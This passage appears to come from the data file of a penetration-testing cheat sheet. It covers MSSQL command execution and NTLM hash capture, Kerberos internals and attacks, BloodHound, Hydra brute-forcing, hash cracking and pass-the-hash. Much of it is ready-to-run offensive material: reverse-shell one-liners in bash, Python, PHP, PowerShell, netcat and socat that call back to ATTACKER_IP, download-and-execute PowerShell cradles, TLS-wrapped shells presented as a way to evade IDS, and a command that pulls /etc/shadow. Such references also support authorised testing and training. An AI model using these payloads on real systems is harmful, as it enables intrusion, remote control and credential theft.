        code: "# Connect via Impacket (with domain auth)\nimpacket-mssqlclient DOMAIN/USER:PASS@TARGET_IP -windows-auth\n\n# Connect via Impacket (SQL auth)\nimpacket-mssqlclient USER:PASS@TARGET_IP\n\n# Enumerate with nmap scripts\nnmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 TARGET_IP"
      },
      {
        heading: "MSSQL — xp_cmdshell (RCE)",
        level: 3,
        content: "xp_cmdshell allows OS command execution from SQL. Must be enabled first — requires sysadmin role.",
        code: "# Enable xp_cmdshell\nEXEC sp_configure 'show advanced options', 1;\nRECONFIGURE;\nEXEC sp_configure 'xp_cmdshell', 1;\nRECONFIGURE;\n\n# Execute OS commands\nEXEC xp_cmdshell 'whoami';\nEXEC xp_cmdshell 'powershell -e BASE64_PAYLOAD';\n\n# In impacket-mssqlclient, use shorthand:\nenable_xp_cmdshell\nxp_cmdshell whoami"
      },
      {
        heading: "MSSQL — xp_dirtree (Hash Capture)",
        level: 3,
        content: "Force the SQL server to authenticate to your SMB listener — captures the service account's NTLMv2 hash. Great when xp_cmdshell is disabled.",
        code: "# On attacker: start Responder or impacket-smbserver\nsudo responder -I tun0\n# OR\nimpacket-smbserver share $(pwd) -smb2support\n\n# On MSSQL: trigger SMB authentication\nEXEC xp_dirtree '\\\\ATTACKER_IP\\share';\n# OR\nEXEC master..xp_dirtree '\\\\ATTACKER_IP\\share';"
      },
      {
        heading: "MSSQL — Enumeration Queries",
        level: 3,
        code: "# Check version\nSELECT @@version;\n\n# List all databases\nSELECT name FROM sys.databases;\n\n# Switch database and list tables\nUSE database_name;\nSELECT * FROM database_name.INFORMATION_SCHEMA.TABLES;\n\n# Query specific table\nSELECT * FROM database_name.dbo.table_name;\n\n# Check current user privileges\nSELECT IS_SRVROLEMEMBER('sysadmin');\n\n# List linked servers (for lateral movement)\nSELECT * FROM sys.servers;"
      },
      {
        heading: "SQLite",
        level: 2,
        content: "File-based database — no network service. Common in mobile apps, embedded systems, and small web apps. Found as .db, .sqlite, or .sqlite3 files.",
        code: "# Open a SQLite database file\nsqlite3 database.db\n\n# List databases and tables\n.databases\n.tables\n\n# Describe table schema\n.schema table_name\n\n# Query data\nSELECT * FROM table_name;\n\n# Dump entire database as SQL\n.dump\n\n# Exit\n.quit"
      },
      {
        heading: "Database Tradecraft",
        level: 2,
        list: [
          "Prefer read-only queries first — avoid modifying data unless necessary",
          "Dump only what's needed for the objective (credentials, PII for proof, config data)",
          "Record exact queries used with timestamps for your report",
          "Avoid destructive queries (DROP, DELETE, TRUNCATE) in shared/production environments",
          "Check for linked databases and database links — they enable lateral movement",
          "Always look for credentials in database config files: wp-config.php, web.config, .env, settings.py"
        ]
      }
    ]
  },

  {
    id: "ad_kerberos",
    title: "Active Directory Kerberos",
    category: "Active Directory",
    icon: "🔐",
    sections: [
      {
        heading: "Kerberos in Active Directory — Full Protocol and Implementation Model",
        level: 2,
        content: "Kerberos in Microsoft Active Directory is a symmetric-key, ticket-based authentication protocol implemented by Kerberos and tightly integrated with directory identity, SPNs, PAC authorization, and Windows security descriptors.\n\nThis is not generic Kerberos. This is Microsoft's extended Kerberos with PAC, S4U, delegation, compound identity, SIDHistory, and trust integration."
      },

      /* 1. Core Cryptographic Model */
      {
        heading: "1. Core Cryptographic Model",
        level: 2,
        content: "Kerberos is built on:",
        list: [
          "Symmetric encryption (AES256, AES128, legacy RC4)",
          "Shared secrets derived from passwords",
          "Time-based replay protection",
          "KDC trust anchor"
        ],
      },
      {
        content: "There are no asymmetric operations in standard ticket exchange. Trust derives from shared secret keys stored in AD."
      },

      /* 2. Core Entities */
      {
        heading: "2. Core Entities",
        level: 2,
      },
      {
        heading: "Principal",
        level: 3,
        content: "Security identity.\nFormat:",
        code: "primary/instance@REALM",
      },
      {
        content: "In AD:",
        list: [
          "User → user@DOMAIN.LOCAL",
          "Service → HTTP/server.domain.local@DOMAIN.LOCAL"
        ]
      },
      {
        heading: "KDC",
        level: 3,
        content: "Runs on domain controllers.\nComponents:",
        list: [
          "Authentication Service (AS)",
          "Ticket Granting Service (TGS)"
        ]
      },
      {
        heading: "TGT (Ticket Granting Ticket)",
        level: 3,
        content: "Encrypted with:",
        code: "KRBTGT account key",
      },
      {
        content: "KRBTGT is the root secret of the domain.\nCompromise = golden ticket capability."
      },
      {
        heading: "Service Ticket (TGS)",
        level: 3,
        content: "Encrypted with:",
        code: "Target service account key",
      },

      /* 3. AD-Specific Enhancements */
      {
        heading: "3. Active Directory–Specific Enhancements",
        level: 2,
        content: "Microsoft extends Kerberos with:",
        list: [
          "PAC (Privilege Attribute Certificate)",
          "SIDHistory",
          "Group expansion",
          "Constrained delegation (S4U)",
          "Resource-based constrained delegation",
          "Claims and compound identity",
          "Forest trust referral tickets"
        ]
      },

      /* 4. Full Authentication Flow */
      {
        heading: "4. Full Authentication Flow",
        level: 2,
      },
      {
        heading: "Phase 1: AS-REQ / AS-REP (Initial Authentication)",
        level: 3,
        content: "Client → KDC:\n\nAS-REQ:",
        list: [
          "Username",
          "Timestamp encrypted with key derived from password",
          "Supported encryption types",
          "Pre-authentication data"
        ]
      },
      {
        content: "KDC verifies timestamp using stored hash.\n\nIf correct, KDC returns AS-REP:",
        list: [
          "TGT (encrypted with KRBTGT key)",
          "Session key (encrypted with user key)"
        ]
      },
      {
        content: "Client decrypts session key using password-derived key.\n\nAt this stage, the client has:",
        list: [
          "TGT",
          "Session key"
        ]
      },
      {
        content: "No service access yet."
      },
      {
        heading: "Phase 2: TGS-REQ / TGS-REP (Service Ticket Request)",
        level: 3,
        content: "Client → KDC:\n\nTGS-REQ:",
        list: [
          "TGT",
          "Authenticator (timestamp encrypted with TGT session key)",
          "Requested SPN"
        ]
      },
      {
        content: "KDC:",
        list: [
          "Decrypts TGT using KRBTGT key",
          "Validates authenticator",
          "Checks policy",
          "Builds PAC",
          "Encrypts service ticket using service account key"
        ],
        numbered: true
      },
      {
        content: "Returns TGS-REP:",
        list: [
          "Service ticket",
          "New session key"
        ]
      },
      {
        content: "Client forwards service ticket to target service."
      },
      {
        heading: "Phase 3: AP-REQ / AP-REP (Service Authentication)",
        level: 3,
        content: "Client → Service:\n\nAP-REQ:",
        list: [
          "Service ticket",
          "Authenticator"
        ]
      },
      {
        content: "Service:",
        list: [
          "Decrypts ticket with its key",
          "Validates authenticator",
          "Extracts PAC",
          "Builds Windows access token"
        ],
        numbered: true
      },
      {
        content: "Optionally returns AP-REP for mutual auth."
      },

      /* 5. PAC */
      {
        heading: "5. Privilege Attribute Certificate (PAC)",
        level: 2,
        content: "PAC is Microsoft's authorization container embedded in tickets.\n\nContains:",
        list: [
          "User SID",
          "Group SIDs",
          "Extra SIDs",
          "SIDHistory",
          "Logon time",
          "UPN",
          "Claims",
          "Delegation info"
        ]
      },
      {
        content: "PAC is signed twice:",
        list: [
          "KDC signature",
          "Server signature"
        ]
      },
      {
        content: "Prevents ticket tampering.\n\nIf KRBTGT is compromised: Attacker can forge valid PAC. This enables Golden Ticket attacks."
      },

      /* 6. Encryption Types */
      {
        heading: "6. Encryption Types",
        level: 2,
        content: "Modern AD:",
        list: [
          "AES256-CTS-HMAC-SHA1-96 (default)",
          "AES128",
          "RC4-HMAC (legacy)",
          "DES (deprecated)"
        ]
      },
      {
        content: "Encryption selection depends on:",
        list: [
          "Client support",
          "Account configuration",
          "Domain functional level"
        ]
      },
      {
        content: "RC4 allows Kerberoasting via NT hash.\nAES requires key derivation from password."
      },

      /* 7. SPNs */
      {
        heading: "7. SPNs (Service Principal Names)",
        level: 2,
        content: "SPN format:",
        code: "service/hostname:port",
      },
      {
        content: "Examples:",
        list: [
          "HTTP/web.domain.local",
          "CIFS/fileserver.domain.local",
          "MSSQLSvc/sql.domain.local:1433"
        ]
      },
      {
        content: "Stored in: servicePrincipalName attribute.\n\nDuplicate SPNs cause authentication failure.\nSPN = routing key for Kerberos."
      },

      /* 8. Ticket Structure */
      {
        heading: "8. Ticket Structure",
        level: 2,
        content: "Each ticket includes:",
        list: [
          "Client principal",
          "Server principal",
          "Session key",
          "Flags",
          "Validity timestamps",
          "PAC"
        ]
      },
      {
        content: "Important flags:",
        list: [
          "FORWARDABLE",
          "RENEWABLE",
          "OK-AS-DELEGATE",
          "PRE-AUTHENT",
          "CANONICALIZE"
        ]
      },
      {
        content: "Ticket lifetime — Default:",
        list: [
          "10 hours validity",
          "7 days renewal"
        ]
      },

      /* 9. Delegation Internals */
      {
        heading: "9. Delegation Internals",
        level: 2,
        content: "Delegation uses:",
        list: [
          "S4U2Self",
          "S4U2Proxy"
        ]
      },
      {
        content: "Controlled by:",
        list: [
          "userAccountControl flags",
          "msDS-AllowedToDelegateTo",
          "msDS-AllowedToActOnBehalfOfOtherIdentity"
        ]
      },
      {
        content: "Delegation never bypasses KDC.\nKDC enforces impersonation rights."
      },

      /* 10. Trusts and Cross-Forest Authentication */
      {
        heading: "10. Trusts and Cross-Forest Authentication",
        level: 2,
        content: "When accessing foreign domain:\nReferral TGT issued:",
        code: "krbtgt/FOREIGNDOMAIN",
      },
      {
        content: "Flow:",
        list: [
          "Home KDC issues referral",
          "Foreign KDC validates trust",
          "Issues service ticket"
        ],
        numbered: true
      },
      {
        content: "Trust direction matters.\nSID filtering may apply."
      },

      /* 11. Attack Surface */
      {
        heading: "11. Attack Surface",
        level: 2,
      },
      {
        heading: "AS-REP Roasting",
        level: 3,
        content: "If pre-auth disabled:\nAS-REP encrypted with user key → offline cracking."
      },
      {
        heading: "Kerberoasting",
        level: 3,
        content: "TGS encrypted with service account key.\nCrack service account password."
      },
      {
        heading: "Golden Ticket",
        level: 3,
        content: "Forge TGT using KRBTGT hash."
      },
      {
        heading: "Silver Ticket",
        level: 3,
        content: "Forge service ticket using service account hash."
      },
      {
        heading: "Overpass-the-Hash",
        level: 3,
        content: "Use NT hash to request TGT."
      },
      {
        heading: "Pass-the-Ticket",
        level: 3,
        content: "Inject ticket into LSASS."
      },
      {
        heading: "Skeleton Key",
        level: 3,
        content: "Patch LSASS to accept universal password."
      },

      /* 12. LSASS and Ticket Storage */
      {
        heading: "12. LSASS and Ticket Storage",
        level: 2,
        content: "Tickets stored in LSASS memory.\n\nTools:",
        list: [
          "Mimikatz",
          "Rubeus"
        ]
      },
      {
        content: "Credential cache includes:",
        list: [
          "TGT",
          "Service tickets",
          "Session keys"
        ]
      },
      {
        content: "Protected by: Credential Guard (virtualization-based security)."
      },

      /* 13. PAC Validation */
      {
        heading: "13. PAC Validation",
        level: 2,
        content: "Service can:",
        list: [
          "Validate PAC locally",
          "Or contact DC for PAC validation"
        ]
      },
      {
        content: "If service trusts KDC signature: No additional DC call.\nThis affects lateral movement detection."
      },

      /* 14. Time Synchronization */
      {
        heading: "14. Time Synchronization",
        level: 2,
        content: "Kerberos requires clock skew ≤ 5 minutes.\nUses: NTP / Windows Time Service.\n\nIf skew too large:",
        code: "KRB_AP_ERR_SKEW",
      },

      /* 15. Ticket Flags Deep Meaning */
      {
        heading: "15. Ticket Flags Deep Meaning",
        level: 2,
        list: [
          "Forwardable — Allows delegation",
          "Renewable — Allows extension without reauthentication",
          "OK-AS-DELEGATE — Indicates service trusted for delegation"
        ]
      },

      /* 16. Machine Accounts */
      {
        heading: "16. Machine Accounts",
        level: 2,
        content: "Computers are principals.\nPassword auto-rotates every 30 days.\n\nMachine accounts can:",
        list: [
          "Request TGT",
          "Perform delegation",
          "Hold SPNs"
        ]
      },
      {
        content: "MachineAccountQuota default = 10.\nAllows normal users to create machines."
      },

      /* 17. RBCD */
      {
        heading: "17. Resource-Based Constrained Delegation",
        level: 2,
        content: "Backend stores:",
        code: "msDS-AllowedToActOnBehalfOfOtherIdentity",
      },
      {
        content: "Access controlled by ACL.\nNo domain admin required if write permissions exist.\nCommon privilege escalation path."
      },

      /* 18. Protected Users Group */
      {
        heading: "18. Protected Users Group",
        level: 2,
        content: "Restrictions:",
        list: [
          "No NTLM",
          "No DES/RC4",
          "No delegation",
          "TGT lifetime 4 hours"
        ]
      },
      {
        content: "Mitigates ticket abuse."
      },

      /* 19. Authentication vs Authorization */
      {
        heading: "19. Authentication vs Authorization",
        level: 2,
        content: "Kerberos authenticates identity.\nPAC provides authorization data.\nWindows access token enforces authorization."
      },

      /* 20. Domain Functional Level Impact */
      {
        heading: "20. Domain Functional Level Impact",
        level: 2,
        content: "Higher functional levels:",
        list: [
          "AES default",
          "Improved PAC",
          "RBCD support",
          "Claims support"
        ]
      },

      /* 21. KRBTGT Rotation */
      {
        heading: "21. KRBTGT Rotation",
        level: 2,
        content: "Golden tickets remain valid until KRBTGT password rotated twice.\n\nDouble reset required because: Previous password hash retained temporarily."
      },

      /* 22. Hardening Model */
      {
        heading: "22. Hardening Model",
        level: 2,
        list: [
          "Disable RC4",
          "Enforce AES",
          "Rotate KRBTGT periodically",
          "Remove unconstrained delegation",
          "Monitor 4769 events",
          "Restrict MachineAccountQuota",
          "Set sensitive accounts non-delegable",
          "Enable Credential Guard",
          "Audit SPN changes"
        ]
      }
    ]
  },

  {
    id: "bloodhound",
    title: "BloodHound",
    category: "Active Directory",
    icon: "🩸",
    sections: [
      {
        heading: "Collection",
        level: 2,
        code: "# Python collector (from Linux)\nbloodhound-python -c All -u USER -p PASS -d DOMAIN -ns DC_IP\n\n# SharpHound on Windows target\n.\\SharpHound.exe -c All\n\n# SharpHound — specific collection methods\n.\\SharpHound.exe -c DCOnly          # DC queries only (stealthier)\n.\\SharpHound.exe -c Session,LoggedOn # Session data only\n\n# NetExec collection\nnxc ldap DC_IP -u USER -p PASS --bloodhound --collection All -ns DC_IP"
      },
      {
        heading: "Neo4j / Import",
        level: 2,
        code: "sudo neo4j start\n# Open BloodHound GUI/CE and upload collection ZIP\n# Default Neo4j creds: neo4j / neo4j (change on first login)\n# BloodHound CE: http://localhost:8080"
      },
      {
        heading: "Built-in High-Value Queries",
        level: 2,
        list: [
          "Find all Domain Admins",
          "Shortest Paths to Domain Admins",
          "Shortest Paths to Domain Admins from Kerberoastable Users",
          "Kerberoastable users with most privileges",
          "AS-REP roastable users (no preauth)",
          "Shortest Paths to Unconstrained Delegation Systems",
          "Shortest Paths from Owned Principals",
          "Users with DCSync rights",
          "Shortest Paths to High Value Targets"
        ]
      },
      {
        heading: "Custom Cypher Queries (Legacy)",
        level: 2,
        content: "Paste these in the Raw Query box in BloodHound Legacy (Neo4j-backed).",
        code: "// All Kerberoastable users\nMATCH (u:User) WHERE u.hasspn=true RETURN u.name, u.serviceprincipalnames\n\n// Users with path to DA\nMATCH p=shortestPath((u:User)-[*1..]->(g:Group {name:'DOMAIN ADMINS@DOMAIN.LOCAL'})) RETURN p\n\n// Computers with Unconstrained Delegation\nMATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name\n\n// Users that can DCSync\nMATCH p=(u)-[:MemberOf|GetChanges|GetChangesAll*1..]->(d:Domain) RETURN u.name\n\n// Find AS-REP roastable users\nMATCH (u:User {dontreqpreauth:true}) RETURN u.name\n\n// All GPOs and who can modify them\nMATCH (g:GPO) OPTIONAL MATCH p=(u)-[:GenericAll|GenericWrite|WriteOwner|WriteDacl]->(g) RETURN g.name, u.name"
      },
      {
        heading: "Attack Path Analysis Workflow",
        level: 2,
        numbered: [
          "Mark owned principals (right-click → Mark as Owned)",
          "Run 'Shortest Paths from Owned Principals' to see reachable targets",
          "Check each edge for required attack type (GenericAll, WriteDacl, ForceChangePassword, etc.)",
          "Prioritize paths through Kerberoastable or AS-REP roastable users",
          "After each privilege gain, re-collect and re-upload data to discover new paths",
          "Check for cross-trust paths between domains/forests"
        ]
      },
      {
        heading: "Edge Types to Watch",
        level: 2,
        list: [
          "GenericAll — Full control over object (force password change, modify attributes)",
          "GenericWrite — Write to any non-protected attribute (set SPN → Kerberoast)",
          "WriteDacl — Modify ACL to grant yourself GenericAll",
          "WriteOwner — Take ownership then WriteDacl → GenericAll",
          "ForceChangePassword — Reset password without knowing current",
          "AddMember — Add yourself to a group",
          "ReadLAPSPassword — Read local admin passwords from LAPS",
          "ReadGMSAPassword — Read gMSA password",
          "AllowedToDelegate — Constrained delegation → service impersonation",
          "AllowedToAct — RBCD → impersonate any user to that service",
          "HasSIDHistory — Inherited privileges from SID history",
          "CanPSRemote / CanRDP / ExecuteDCOM — Remote code execution paths"
        ]
      },
      {
        heading: "Practical Notes",
        level: 2,
        list: [
          "Re-run collection after privilege changes — graph paths go stale after password resets, group changes, or delegation updates",
          "Use --exclude-dcs with SharpHound if touching DCs is out of scope",
          "Session data requires admin on target machines — collect from DCs via -c DCOnly as fallback",
          "BloodHound CE uses PostgreSQL instead of Neo4j — different query syntax (API-based)",
          "Export paths to screenshots for your report before clearing data"
        ]
      }
    ]
  },

  {
    id: "hydra_bruteforce",
    title: "Bruteforcing with Hydra",
    category: "Credential Attacks",
    icon: "🔓",
    sections: [
      {
        heading: "Hydra Basics",
        level: 2,
        content: "Hydra performs online credential guessing against many protocols. Keep thread count and request rate controlled to avoid lockouts.",
        code: "hydra -l admin -P passwords.txt ssh://10.10.10.10"
      },
      {
        heading: "Common Protocol Examples",
        level: 2,
        code: "# SSH\nhydra -L users.txt -P pass.txt -t 4 ssh://10.10.10.10\n\n# RDP\nhydra -L users.txt -P pass.txt rdp://10.10.10.20\n\n# FTP\nhydra -l ftp -P pass.txt ftp://10.10.10.30\n\n# SMB\nhydra -L users.txt -P pass.txt smb://10.10.10.40"
      },
      {
        heading: "HTTP Forms",
        level: 2,
        content: "For web logins, define request path, body parameters, and fail condition string.",
        code: "hydra -L users.txt -P pass.txt 10.10.10.50 http-post-form \"/login.php:username=^USER^&password=^PASS^:F=Invalid credentials\""
      },
      {
        heading: "Safe Usage Checklist",
        level: 2,
        list: [
          "Validate account lockout policy first",
          "Use low thread count (-t 2 to -t 6) on production-like targets",
          "Use known username list quality over huge random lists",
          "Log successful credentials immediately with timestamp and service"
        ]
      }
    ]
  },

  {
    id: "hash_cracking",
    title: "Hash Cracking",
    category: "Credential Attacks",
    icon: "🧪",
    sections: [
      {
        heading: "Identification First",
        level: 2,
        content: "Correctly identify hash type before cracking. Wrong mode wastes time and gives false negatives.",
        code: "# Quick identification\nhashid <hash>\n\n# Extract hash material from dumps before cracking\n# (NTLM, Kerberos TGS, AS-REP, bcrypt, etc.)"
      },
      {
        heading: "Hashcat Examples",
        level: 2,
        code: "# NTLM (mode 1000)\nhashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt\n\n# Kerberos 5 TGS-REP etype 23 (Kerberoast)\nhashcat -m 13100 -a 0 kerberoast.txt wordlist.txt\n\n# Show cracked creds\nhashcat -m 1000 hashes.txt --show"
      },
      {
        heading: "John the Ripper Examples",
        level: 2,
        code: "# Generic wordlist mode\njohn --wordlist=wordlist.txt hashes.txt\n\n# Incremental mode (slow, broad)\njohn --incremental hashes.txt\n\n# Show results\njohn --show hashes.txt"
      },
      {
        heading: "Rule-Based Attacks",
        level: 2,
        content: "Prefer targeted rules and org-specific words over huge blind brute-force.",
        code: "# Hashcat with rules\nhashcat -m 1000 -a 0 hashes.txt base_words.txt -r /usr/share/hashcat/rules/best64.rule"
      },
      {
        heading: "Operational Practices",
        level: 2,
        list: [
          "Track source and timestamp for each hash set",
          "Separate cracked credentials by system/domain",
          "Prioritize privileged/service accounts first",
          "Immediately validate cracked creds carefully to avoid lockouts"
        ]
      },
      {
        heading: "Common Hashcat Mode Reference",
        level: 2,
        list: [
          "0 — MD5",
          "100 — SHA1",
          "500 — MD5crypt (Unix $1$)",
          "1000 — NTLM",
          "1800 — SHA-512crypt (Unix $6$)",
          "2100 — DCC2 / MsCacheV2",
          "3200 — bcrypt",
          "5500 — NTLMv1",
          "5600 — NTLMv2",
          "13100 — Kerberoast (TGS-REP etype 23)",
          "18200 — AS-REP Roast",
          "19600 — Kerberos 5 TGS-REP etype 17 (AES128)",
          "19700 — Kerberos 5 TGS-REP etype 18 (AES256)"
        ]
      },
      {
        heading: "Pass-the-Hash (When Cracking Isn't Needed)",
        level: 2,
        content: "NTLM hashes are not salted — they can be used directly for authentication without cracking.",
        code: "# CrackMapExec spray\ncrackmapexec smb SUBNET/24 -u administrator -H 'NTHASH'\n\n# Impacket PsExec\nimpacket-psexec DOMAIN/administrator@TARGET -hashes 'LMHASH:NTHASH'\n\n# Impacket WmiExec\nimpacket-wmiexec DOMAIN/administrator@TARGET -hashes 'LMHASH:NTHASH'\n\n# SMB via smbclient\nsmbclient //TARGET/SHARE -U administrator --pw-nt-hash NTHASH"
      }
    ]
  },

  {
    id: "common_reverse_shells",
    title: "Common Reverse Shells",
    category: "Shell Operations",
    icon: "🐚",
    sections: [
      {
        heading: "Bash",
        level: 2,
        code: "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"
      },
      {
        heading: "Python",
        level: 2,
        code: "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"ATTACKER_IP\",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'"
      },
      {
        heading: "PHP",
        level: 2,
        code: "php -r '$sock=fsockopen(\"ATTACKER_IP\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
      },
      {
        heading: "PowerShell",
        level: 2,
        code: "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
      },
      {
        heading: "Netcat",
        level: 2,
        content: "First form requires nc with -e flag. The mkfifo variant works on all netcat versions.",
        code: "nc -e /bin/bash ATTACKER_IP 4444\n\n# mkfifo variant (works everywhere)\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f"
      },
      {
        heading: "PowerShell (powercat)",
        level: 2,
        content: "Download powercat to target, then execute reverse shell. Requires outbound HTTP to fetch the script.",
        code: "IEX (New-Object System.Net.Webclient).DownloadString('http://ATTACKER_IP/powercat.ps1');powercat -c ATTACKER_IP -p 4444 -e powershell"
      },
      {
        heading: "PowerShell IWR Cradle",
        level: 2,
        content: "Download and execute a reverse shell PS1 script from attacker in one line.",
        code: "powershell -c 'IEX(IWR http://ATTACKER_IP:8000/revshell.ps1 -UseBasicParsing)'"
      },
      {
        heading: "Nishang Invoke-PowerShellTcp",
        level: 2,
        content: "Append the invocation line to the end of Invoke-PowerShellTcp.ps1, then host it and trigger IEX download on target.",
        code: "# Append to Invoke-PowerShellTcp.ps1:\nInvoke-PowerShellTcp -Reverse -IPAddress ATTACKER_IP -Port 4444\n\n# Host and trigger on target via IEX download"
      }
    ]
  },

  {
    id: "reverse_shell_listeners",
    title: "Reverse Shell Listener Setup",
    category: "Shell Operations",
    icon: "🎧",
    sections: [
      {
        heading: "Netcat / Ncat",
        level: 2,
        content: "The most basic listener. Use ncat (from Nmap) for additional features like SSL. Good for quick catches but provides a raw, unstable shell.",
        code: "# Traditional netcat listener\nnc -lvnp 4444\n\n# Ncat with verbose output\nncat -lvnp 4444\n\n# Ncat with SSL encryption (pair with ncat reverse shell)\nncat --ssl -lvnp 4444"
      },
      {
        heading: "rlwrap + nc",
        level: 2,
        content: "Wraps netcat with GNU readline — gives you arrow keys, command history, and line editing even on raw shells. Highly recommended as your default listener.",
        code: "rlwrap -cAr nc -lvnp 4444"
      },
      {
        heading: "Socat Encrypted Listener",
        level: 2,
        content: "Socat with OpenSSL provides an encrypted reverse shell that evades network IDS/IPS. Requires generating a certificate first, and the target must have socat installed.",
        code: "# Step 1: Generate self-signed certificate on attacker\nopenssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 365 -out shell.crt\ncat shell.key shell.crt > shell.pem\n\n# Step 2: Start encrypted listener\nsocat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0,fork STDOUT\n\n# Step 3: Full interactive TTY listener (auto-upgrades the shell)\nsocat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0 FILE:`tty`,raw,echo=0\n\n# On target (Linux): connect back with encrypted socat\nsocat OPENSSL:ATTACKER_IP:4444,verify=0 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane"
      },
      {
        heading: "Metasploit multi/handler",
        level: 2,
        content: "The most versatile listener — handles staged/stageless payloads, auto-upgrades to Meterpreter, supports multiple concurrent sessions. Essential for msfvenom payloads.",
        code: "# Standard setup\nmsfconsole -q\nuse exploit/multi/handler\nset payload windows/x64/meterpreter/reverse_tcp\nset LHOST tun0\nset LPORT 4444\nset ExitOnSession false   # Keep listening after first connection\nrun -j                     # Run as background job\n\n# One-liner (quick setup)\nmsfconsole -q -x \"use exploit/multi/handler; set PAYLOAD linux/x64/shell_reverse_tcp; set LHOST tun0; set LPORT 4444; exploit\"\n\n# Common payloads to match:\n# windows/x64/meterpreter/reverse_tcp    (staged, Meterpreter)\n# windows/x64/shell_reverse_tcp          (stageless, cmd shell)\n# linux/x64/shell_reverse_tcp            (stageless, /bin/sh)\n# linux/x64/meterpreter/reverse_tcp      (staged, Meterpreter)"
      },
      {
        heading: "pwncat-cs",
        level: 2,
        content: "Modern Python-based listener and post-exploitation framework. Auto-upgrades shells to full TTY, provides built-in enumeration, file transfer, and persistence. A significant upgrade over plain netcat.",
        code: "# Listen for reverse shell\npwncat-cs -lp 4444\n\n# Connect to a bind shell\npwncat-cs TARGET_IP:4444\n\n# Once connected — pwncat commands (press Ctrl+D to toggle local/remote):\nupload ./linpeas.sh /tmp/linpeas.sh\ndownload /etc/shadow ./shadow.txt\nrun enumerate\nrun enumerate.gather"
      },
      {
        heading: "Listener Selection Guide",
        level: 2,
        list: [
          "Quick catch, no frills → rlwrap nc -lvnp PORT",
          "Msfvenom / staged payloads → multi/handler (required for staged)",
          "Encrypted / IDS evasion → socat with OpenSSL certificate",
          "Auto-upgrade + post-exploitation → pwncat-cs",
          "Multiple simultaneous shells → multi/handler with ExitOnSession false"
        ]
      },
      {
        heading: "Common Listener Pitfalls",
        level: 2,
        list: [
          "Wrong LHOST — use your reachable interface (tun0 for VPN, eth0 for LAN, not 127.0.0.1)",
          "Firewall blocking inbound listener port — try common ports: 80, 443, 8080",
          "Payload architecture mismatch — x86 payload won't work on x64-only target and vice versa",
          "Staged payload sent to plain nc listener — nc can't handle staging, use multi/handler",
          "NAT or split tunnel issues — ensure your VPN routes traffic correctly to the target network"
        ]
      }
    ]
  },

  {
    id: "shell_stabilization",
    title: "Shell Stabilization",
    category: "Shell Operations",
    icon: "🛠️",
    sections: [
      {
        heading: "Why Stabilize?",
        level: 2,
        content: "Raw reverse shells lack tab completion, arrow keys, job control (Ctrl+C kills the shell), and proper terminal sizing. Stabilization upgrades a dumb shell to a fully interactive TTY so you can use tools like vim, su, and ssh normally."
      },

      /* ── Method 1: Python PTY ── */
      {
        heading: "Method 1: Python PTY Upgrade (Most Common)",
        level: 2,
        content: "Works on any Linux target with Python installed. This is the go-to method.",
        code: "# Step 1: Spawn a PTY\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n\n# Step 2: Set terminal type\nexport TERM=xterm\n\n# Step 3: Background the shell\n# Press: Ctrl+Z\n\n# Step 4: Configure your local terminal and foreground\nstty raw -echo; fg\n\n# Step 5: Reset terminal (type blindly — it works)\nreset"
      },

      /* ── Method 2: script ── */
      {
        heading: "Method 2: script Command",
        level: 2,
        content: "Works when Python is not available. The script utility spawns a PTY for recording terminal sessions — we abuse it for shell upgrade.",
        code: "# Step 1: Spawn PTY via script\n/usr/bin/script -qc /bin/bash /dev/null\n\n# Step 2: Set terminal type\nexport TERM=xterm\n\n# Step 3: Background the shell\n# Press: Ctrl+Z\n\n# Step 4: Configure and foreground\nstty raw -echo; fg; reset"
      },

      /* ── Method 3: socat ── */
      {
        heading: "Method 3: Socat Full TTY",
        level: 2,
        content: "Socat can give you a fully interactive shell with proper TTY from the start — no manual upgrade needed. Requires socat on both attacker and target.",
        code: "# Attacker: listen with TTY allocation\nsocat file:`tty`,raw,echo=0 tcp-listen:4444\n\n# Target: connect back with full TTY\nsocat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444\n\n# If socat isn't on target, transfer a static binary:\n# wget http://ATTACKER_IP/socat -O /tmp/socat && chmod +x /tmp/socat"
      },

      /* ── Method 4: Encrypted Socat ── */
      {
        heading: "Method 4: Socat Encrypted TTY (TLS)",
        level: 2,
        content: "Encrypt the shell connection with TLS to avoid network detection. Generate a self-signed cert first.",
        code: "# Generate self-signed certificate on attacker\nopenssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt\ncat shell.key shell.crt > shell.pem\n\n# Attacker: encrypted listener with TTY\nsocat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0 FILE:`tty`,raw,echo=0\n\n# Target: encrypted reverse shell with full TTY\nsocat OPENSSL:ATTACKER_IP:4444,verify=0 EXEC:'bash -li',pty,stderr,sigint,setsid,sane"
      },

      /* ── Windows ── */
      {
        heading: "Windows Shell Handling",
        level: 2,
        content: "Windows shells (cmd.exe, PowerShell) don't support PTY upgrades the same way. Instead, wrap the listener side for better usability.",
